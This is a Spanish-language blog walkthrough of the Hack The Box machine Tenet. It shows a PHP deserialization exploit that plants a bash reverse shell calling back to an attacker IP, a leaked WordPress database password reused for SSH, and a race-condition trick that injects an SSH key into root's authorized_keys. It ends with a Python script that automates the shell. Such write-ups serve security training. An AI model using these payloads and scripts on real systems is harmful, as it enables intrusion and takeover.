---
layout: single
title: Tenet - Hack The Box
excerpt: "Tenet es una maquina perfecta para aprender PHP, me ha obligado a leerme mucho codigo php y entender a bajo nivel como funciona la serializacion y deserializacion de codigo PHP, luego la escalada me ha gustado bastante, esta vez no es abusando de un permiso o cualquier cosa, esta vez hay que pensar bien como se puede vulnerar y aprovecharnos de un script"
date: 2021-08-18
classes: wide
header:
  teaser: /assets/images/tenet/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   Wordpress
  -   PHP Deserialization
---

# Tenet

Script automatizado para la intrusión como www-data: [https://pastebin.com/epNw7PSz](https://pastebin.com/epNw7PSz)

<div>
<p style = 'text-align:center;'>
<img src="https://fmash16.github.io/img/htb_tenet/card.png" alt="" width="600px">
</p>
</div>

<div>
<p style = 'text-align:center;'>
<img src="https://0xdf.gitlab.io/img/tenet-radar.png" alt="" width="250px">
</p>
</div>

# **ENUMERACION**

Como siempre analizamos los puertos abiertos que tiene la maquina

```bash
❯ nmap -sC -sV -p80,22 10.10.10.223 -oN scanPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 05:42 EDT
Nmap scan report for 10.10.10.223
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Con la herramienta `whatweb` analizamos un poco la web

```bash
❯ whatweb http://10.10.10.223 > whatweb                                                                                                                                                                                                                                           
❯ cat whatweb
http://10.10.10.223 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], Title[Apache2 Ubuntu Default Page: It works]
```

No nos muestra informacion asi que puedo estar pensando que por detras se esta realizando Virtual Hosting, muchas de las maquinas de HTB usan el propio nombre cn el .htb al final, lo agregamos al /etc/hosts y recargamos la pagina

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.223    tenet.htb
```

![Untitled](/assets/images/tenet/Untitled%202.png)

Estamos ante un Wordpress, con la herramienta wpscan podemos enumerar muchas cosas, entre ellas informacion de la pag web y usuarios:

```bash
❯ whatweb http://tenet.htb/ > whatweb2                                                                                                                                                                                                                                         
❯ cat whatweb2
http://tenet.htb/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], MetaGenerator[WordPress 5.6], PoweredBy[--], Script, Title[Tenet], UncommonHeaders[link], WordPress[5.6]
```

```bash
❯ wpscan --url http://tenet.htb/ --enumerate u

[i] User(s) Identified:

[+] protagonist
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] neil
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Tambien existe un script en lua de nmap que sirve para escanear un poco las paginas de Wordpress

```bash
❯ nmap --script http-wordpress-enum -p80 10.10.10.223 -oN WordpressScan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 06:06 EDT
Nmap scan report for tenet.htb (10.10.10.223)
Host is up (0.095s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    akismet 4.1.7
```

No encontramos nada interesante, asi que enumeramos la pagina nosotros mismos, encontramos un comentario del usuario Neil, el cual habla sobre un archivo sator.php y un backup

Esto me hace pensar que puede haber algun archivo llamado sator.php alojado en la maquina, despues de probar en varios directorios pruebo a ver si existe el subdominio sator para el dominio tenet.htb:

![Untitled](/assets/images/tenet/Untitled%203.png)

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.223    tenet.htb sator.tenet.htb
```

Existe y tambien existe el archivo sator.php

![Untitled](/assets/images/tenet/Untitled%204.png)

Pero y a que se referia con el backup, pues algo posible a enumerar es probar extensiones relacionadas con backups como por ejemplo .bak

¿Que es un archivo BAK?

BA-K es la extensión de archivo utilizada por un gran número de diferentes aplicaciones para almacenar datos de copia de seguridad.

![Untitled](/assets/images/tenet/Untitled%205.png)

Lo abrimos y podemos ver el codigo fuente de la pagina sator.php:

```bash
❯ cat sator.php.bak
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```

# **EXPLOTACION**

### PHP DESERIALIZATION

Estudiando el codigo php de la pagina web encuentro que podemos pasarle un input a traves de la variable 'arepo' , por lo cual podemos tratar de pasarle un payload malicioso serializado en php para que luego nos lo deserialize:

`$input = $_GET['arepo'] ?? '';`

lo que le pasemos a traves de 'arepo' lo almacena en $input

`$databaseupdate = unserialize($input);`

deserializa el input y lo almacena en databaseupdate

En este [link](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) nos enseña a como aprovecharnos de esto para coseguir colocar un archivo con el contenido malicioso.

Encuentro en GitHub un exploit que nos viene al pelo: [exploit](https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php)

Si nos fijamos la estructura es muy parecida a nuestro php, solo tenemos que cambiar algunas cosas, el resultado final del exploit quedaria asi:

```php
<?php 
class DatabaseExport
{
   public $user_file = 'rce.php';
   public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.16.198/443 0>&1\'"); ?>';
}
$url = 'http://sator.tenet.htb/sator.php?arepo='; // Change it to arbitrary url
print urlencode(serialize(new DatabaseExport()));
?>
```

Lo ejecutamos y nos da un contenido serializado que se lo tenemos que pasar a 'arepo' :

```bash
❯ curl -s "http://sator.tenet.htb/sator.php/?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.16.198%2F443+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D"
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>   
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────                                                                                                                                                                                                                                        
❯ curl -s "http://sator.tenet.htb/rce.php"

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.223] 60974
whoami
www-data
```

( ☞◔ ౪ ◔)☞ Tenemos una shell como www-data, realizamos el tratamiento de la TTY para tener una shell interactiva, vamos a enumerar el sistema para escalar privilegios con linpeas.sh y nos reporta una contraseña de neil

```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)                                                                                                                                                                                          
-rw-r--r-- 1 www-data www-data 3185 Jan  7  2021 /var/www/html/wordpress/wp-config.php                                                                                                                                                     
define( 'DB_NAME', 'wordpress' );                                                                                                                                                                                                          
define( 'DB_USER', 'neil' );                                                                                                                                                                                                               
define( 'DB_PASSWORD', 'Opera2112' );                                                                                                                                                                                                      
define( 'DB_HOST', 'localhost' );
```

Podemos conectarnos por ssh con la cuenta de neil:

```bash
❯ ssh neil@10.10.10.223
The authenticity of host '10.10.10.223 (10.10.10.223)' can't be established.
ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.223' (ECDSA) to the list of known hosts.
neil@10.10.10.223's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
neil@tenet:~$ cat user.txt 
0db1ca0---8243fdd4268---------
neil@tenet:~$
```

# **ESCALACION DE PRIVILEGIOS**

Podemos ejecutar como cualquier usuario este script:

```bash
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

neil@tenet:~$ sudo -u root /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
```

Lo que hace este script es definir una variable llamada key a la cual le pasan una clave publica de root, luego ejecuta la funcion addkey que lo que hace es :

```bash
addKey() {                                                                                                           
                                                                                                                     
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)                                                                       
                                                                                                                     
        (umask 110; touch $tmpName)                                                                                 
                                                                                                                     
        /bin/echo $key >>$tmpName                                                                                   
                                                                                                                   
        checkFile $tmpName                                                                                           
                                                                                                                     
        /bin/cat $tmpName >>/root/.ssh/authorized_keys                                                             
                                                                                                                     
        /bin/rm $tmpName                                                                                          
                                                                                                                     
}
```

Crea una carpeta en /tmp con un nombre aleatorio ssh-XXXXX las X son letras o numeros aleatorios, luego mete la clave publica en ese archivo creado, lo chequea con la funcion checkFile y lo elimina:

```bash
neil@tenet:~$ sudo -u root /usr/local/bin/enableSSH.sh                                                             
Successfully added root@ubuntu to authorized_keys file!                                                              

│neil@tenet:/tmp$ while true; do ls -la;done | grep -v -i -E ".test|X11|XIM|system|vmware|total|pspy64s|."
│ls: cannot access 'ssh-tclsaPVs': No such file or directory
```

La idea seria realizar un secuestro de ese archivo intentando ser mas rapido que el borrado del archivo, nos aprovechamos de que root ejecuta este archivo para asi añadir nuestra clave publica (id_rsa.pub) que nos hemos creado con `ssh-keygen` 

Necesitaremos tener 2 consolas abiertas, una para hacer un bucle en el que ejecute infinitamente un `echo` y que añada nuestra `id_rsa.pub` al archivo que crea el script gracias a 

`| tee /tmp/ssh*`  el * lo que hace es generalizar por cualquier archivo que se llama ssh[loquesea] de esta forma podemos añadir nuestra clave antes de que el script lo elimine.

Ejecutamos el bucle, en la otra terminal ejecutamos un par de veces el script como root y ya podemos acceder por ssh al sistema como el usuario root, ya que hemos añadido nuestra clave publica id_rsa.pub al `authorized_keys` de la maquina

```bash
neil@tenet:~$ while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA******************+3pDXrNbTdMPY07cfQHLmx45hhsQBOa9QGOGxxey9TrV6DojyYIf3ScKFsPQNvB1NUz2v8whgnBQ1h4Zny4khj0btaRuYDD7+1gw***********2AMa5MSwQsE6RrZ/TD9v+Ljx79vrw/VRGTfETCzP4EQQtktyLbHbAWiM8QxjmbdZ5anYRg4XrjiYmTZ08nU1I2217szuj4Gf36bHIUErBbaSKHAyLph1nh3uMzGHVIAA+nn22+KJvlT6bRWd9Ff7EosE6SQk0HPmS4ZQvJrQdAsDQdJDlt7InSpJ3ogHNqi2Zpe2eljl3P57NviKUr4dqRz0BcBQws2mRJQrbI2vR/RTaXdoMNk= root@kali" | tee /tmp/ssh*; done
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────                                                                                                                                                                                                                                       
❯ ssh root@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
Last login: Thu Feb 11 14:37:46 2021
root@tenet:~#
```

Os dejo por aqui tambien el Script qutomatizado para la intrusion como el usuario www-data:

```python
#!/usr/bin/python3

#Script que automatiza la intrusion como www-data en la maquina Tenet de HTB
#Solo teneis que cambiar la IP

import requests
import sys
import time
import threading
from pwn import *

#Variables
IP = "10.10.16.198" # <= Cambiar IP
url_main = "http://10.10.10.223/sator.php/?arepo="
url_shell = "http://10.10.10.223/tukurce.php"
payload = "O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22tukurce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F"
payload2 = "%2F443+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D"
lport = 443
#Funciones
def obtainShell():
    
    try:
        s = requests.Session()
        r = s.get(url_main+payload+IP+payload2)
        p1 = log.progress("\n[*]Ejecutando PHP Deserialization\n")
        time.sleep(2)
        p1.status("\nEnviando el payload malicioso...\n")
        r = s.get(url_shell)

    except Exception as e:
        print(e)

if __name__ == '__main__':
    try:
        threading.Thread(target=obtainShell).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=5).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha podido entrablar conexion")
        sys.exit()
    else:
        log.success("\n ✔️  Se ha obtenido una shell ✔️ \n")
        time.sleep(1)
        log.info("\nAcceso como www-data\n")
        time.sleep(1)

    shell.interactive()
```